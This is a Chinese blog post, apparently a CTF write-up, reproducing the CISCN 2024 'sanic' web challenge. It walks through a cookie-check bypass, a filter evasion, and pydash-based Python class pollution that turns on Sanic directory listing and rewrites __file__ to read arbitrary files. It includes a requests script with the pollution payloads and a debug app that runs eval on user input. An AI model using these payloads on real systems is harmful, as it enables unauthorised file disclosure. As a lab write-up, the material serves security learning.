@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>2024ciscn“sanic”复现 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-07-22">2024年7月22日</time>
+        
+        
+          <span class="post__readtime">10 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/CTF/">#CTF</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">2024ciscn“sanic”复现</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <!--toc-->
+
+
+
+<p>参考原文</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18205235">CISCN2024-WEB-Sanic gxngxngxn - gxngxngxn - 博客园 (cnblogs.com)</a></p>
+<h1 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h1><p>右键查看源码，&#x2F;src路由找到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from sanic import Sanic</span><br><span class="line">from sanic.response import text, html</span><br><span class="line">from sanic_session import Session</span><br><span class="line">import pydash</span><br><span class="line"># pydash==5.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Pollute:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def login(request):</span><br><span class="line">    user = request.cookies.get(&quot;user&quot;)</span><br><span class="line">    if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="line">        request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="line">        return text(&quot;login success&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;login fail&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def admin(request):</span><br><span class="line">    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="line">        key = request.json[&#x27;key&#x27;]</span><br><span class="line">        value = request.json[&#x27;value&#x27;]</span><br><span class="line">        if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            return text(&quot;success&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>/admin</code>路由中的<code>pydash.set_</code>可以在嵌套的字典中设置值。<code>pydash.set_</code>的参数可控 可以通过这个对修改<code>__file__</code></p>
+<p>在此之前要先让<code>request.ctx.session.get(&#39;admin&#39;)</code>的值为<code>True</code></p>
+<p>在<code>/login</code>路由当<code>Cookie</code>中的user的值为<code>adm;n</code>时会将<code>request.ctx.session.get(&#39;admin&#39;)</code>的值设置为<code>True</code>  但是Cookie中有<code>;</code>时会存在截断  用8进制绕过  (RFC2068 的编码规则)</p>
+<p><code>_.</code>被过滤了，pydash中的unescape_path_key()进行替换</p>
+<p><img src="/../img/Typora/image-20240722182457553.png" alt="image-20240722182457553"></p>
+<ul>
+<li>替换路径键中的双反斜杠 (<code>\\</code>) 为单反斜杠 (<code>\</code>)。</li>
+<li>替换路径键中的转义点 (<code>\.</code>) 为点 (<code>.</code>)。</li>
+</ul>
+<p>尝试污染<code>__file__</code></p>
+<p><img src="/../img/Typora/image-20240722184221304.png" alt="image-20240722184221304"></p>
+<p><img src="/../img/Typora/image-20240722184226206.png" alt="image-20240722184226206"></p>
+<p>由于不知道flag在那个文件中，无法进行读取</p>
+<p>然后就需要我们用污染的方式打开列目录功能，然后查看含有flag文件的名字</p>
+<p><img src="/../img/Typora/image-20240722184843271.png" alt="image-20240722184843271"></p>
+<p><img src="/../img/Typora/image-20240722184850215.png" alt="image-20240722184850215"></p>
+<p><code>static</code>中的<code>directory_view</code>被设置为true时，会开启目录浏览功能。而Directory_handler可以控制显示的目录</p>
+<p>Directory_handler调用了DirectoryHandler类</p>
+<p>跟进DirectoryHandler类+</p>
+<p><img src="/../img/Typora/image-20240722185253922.png" alt="image-20240722185253922"></p>
+<p>在router.py中的下一个断点</p>
+<p><img src="/../img/Typora/image-20240722185346407.png" alt="image-20240722185346407"></p>
+<p><img src="/../img/Typora/image-20240722185546642.png" alt="image-20240722185546642"></p>
+<p><img src="/../img/Typora/image-20240722185609795.png" alt="image-20240722185609795"></p>
+<p>这里需要将<code>directory_view</code>污染为<code>True</code>。将<code>parts</code>污染为根目录</p>
+<p>写一个简易demo在本地调试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建Sanic应用</span></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>,<span class="string">&quot;/static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一个简单的路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义admin路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;admin&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    pydash.set_(pollute,key,value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#启动应用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>,port = <span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这个框架可以通过**app.router.name_index[‘xxxxx’]**来获取注册的路由</p>
+<p><img src="/../img/Typora/image-20240722190157683.png" alt="image-20240722190157683"></p>
+<p><img src="/../img/Typora/image-20240722190251523.png" alt="image-20240722190251523"></p>
+<p>然后可以通过下图的树状结构去寻找<code>direct_view</code></p>
+<p><img src="/../img/Typora/image-20240722190718291.png" alt="image-20240722190718291"></p>
+<p><img src="/../img/Typora/image-20240722190622357.png" alt="image-20240722190622357"></p>
+<p>对<code>directory_view</code>的值进行污染</p>
+<p><img src="/../img/Typora/image-20240723103942026.png" alt="image-20240723103942026"></p>
+<p><img src="/../img/Typora/image-20240723103958746.png" alt="image-20240723103958746"></p>
+<p>然后再<code>directory</code>的值进行污染</p>
+<p><img src="/../img/Typora/image-20240723104453157.png" alt="image-20240723104453157"></p>
+<p><code>directory</code>是一个对象，里面的值有parts决定。parts，是一个tuple无法被直接污染。</p>
+<p>先回到<code>DirectoryHandler</code>类中，跟进path</p>
+<p><img src="/../img/Typora/image-20240723104657434.png" alt="image-20240723104657434">	</p>
+<p><img src="/../img/Typora/image-20240723104909435.png" alt="image-20240723104909435"></p>
+<p>访问这个属性，发现是字典类型。（自己在调试器里面没找到，只好像大佬一样访问这个属性了）</p>
+<p><img src="/../img/Typora/image-20240723105559549.png" alt="image-20240723105559549"></p>
+<p>本地环境出现些小问题，污染<code>_parts</code>用ctfshow的靶场</p>
+<p>这里用我bp发包会出现些问题，用<code>gxngxngxn</code>佬的脚本打</p>
+<p>这里贴上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#开启列目录</span><br><span class="line">#data = &#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: True&#125;</span><br><span class="line"></span><br><span class="line">#将目录设置在根目录下</span><br><span class="line">data = &#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;</span><br><span class="line"></span><br><span class="line">#读取flag文件</span><br><span class="line">#data = &#123;&quot;key&quot;:&quot;__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/flag文件名字&quot;&#125;</span><br><span class="line"></span><br><span class="line">cookie=&#123;&quot;session&quot;:&quot;2678fc75aeb241b3a46c52747e9fa7ff&quot;&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=&#x27;https://7d67a488-843e-497b-988e-b4fa1f0be3d5.challenge.ctf.show/admin&#x27;, json=data,cookies=cookie,verify=False)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>最后通过污染<code>__file__</code>读取flag</p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2026-03-26">2026·03·26</time>
+          <a class="related__link" href="/2026/03/26/CTF/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B_easy_time/">第十九届全国大学生信息安全竞赛暨第三届“长城杯”铁人三项赛半决赛_easy_time</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-12-15">2024·12·15</time>
+          <a class="related__link" href="/2024/12/15/CTF/2024.12.15CISCN&%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/">	</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-11-01">2024·11·01</time>
+          <a class="related__link" href="/2024/11/01/CTF/ImaginaryCTF%202024/">ImaginaryCTF 2024</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/07/30/%E9%9D%B6%E6%9C%BA/zico2/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">zico2</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/07/17/CTF/buuCTF/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">刷BuuCTF</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
